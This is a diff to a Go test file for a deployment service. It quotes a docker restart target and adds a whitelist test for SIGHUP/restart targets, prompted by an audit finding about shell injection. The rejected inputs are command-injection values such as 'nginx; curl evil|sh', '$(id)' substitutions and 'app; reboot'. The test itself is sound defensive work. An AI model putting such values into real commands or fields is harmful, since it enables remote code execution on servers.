@@ -177,7 +177,7 @@ func TestApplyActions(t *testing.T) {
 	if err := svc.Deploy(ctx, f2.ID, "op"); err != nil {
 		t.Fatal(err)
 	}
-	if len(exec.commands) != 2 || !strings.Contains(exec.commands[1], "docker restart myapp") {
+	if len(exec.commands) != 2 || !strings.Contains(exec.commands[1], "docker restart 'myapp'") {
 		t.Errorf("应执行 docker restart: %v", exec.commands)
 	}
 	// 目标缺失校验
@@ -687,5 +687,39 @@ func TestMergedPreview(t *testing.T) {
 	out2, err := svc.MergedPreview(t.Context(), 1, "prod", "yaml")
 	if err != nil || !strings.Contains(out2.Body, "feature_x: \"true\"") && !strings.Contains(out2.Body, "feature_x: true") {
 		t.Fatalf("yaml 输出异常: %v %s", err, out2.Body)
+	}
+}
+
+// 生效目标白名单（v0.12.0 审计严重项 3）：SIGHUP/restart 目标拼进远端 shell，
+// 只查非空的时代 'x$(id)y'、'nginx; curl evil|sh' 都能直接执行。
+func TestValidateTargetWhitelist(t *testing.T) {
+	ok := []struct{ action, target string }{
+		{ApplySighup, "nginx"},
+		{ApplySighup, "/usr/sbin/nginx"},
+		{ApplyRestart, "app-web-1"},
+		{ApplyRestart, "my.app.2"},
+		{ApplyHTTP, "http://127.0.0.1/refresh"},
+		{"none", ""},
+	}
+	for _, c := range ok {
+		if err := validateTarget(c.action, c.target); err != nil {
+			t.Errorf("合法目标被拒: %v(%q)", err, c.target)
+		}
+	}
+	bad := []struct{ action, target string }{
+		{ApplySighup, "x$(id)y"},
+		{ApplySighup, "nginx; curl evil|sh"},
+		{ApplySighup, "nginx`id`"},
+		{ApplyRestart, "app; reboot"},
+		{ApplyRestart, "app $(id)"},
+		{ApplyRestart, "-p"},          // 前导 - 可能被当 docker 标志
+		{ApplySighup, "nginx worker"}, // 空白分隔：拒绝（pkill -f 需精确名）
+		{ApplySighup, ""},
+		{ApplyRestart, ""},
+	}
+	for _, c := range bad {
+		if err := validateTarget(c.action, c.target); err == nil {
+			t.Errorf("非法目标未被拒: action=%s target=%q", c.action, c.target)
+		}
 	}
 }
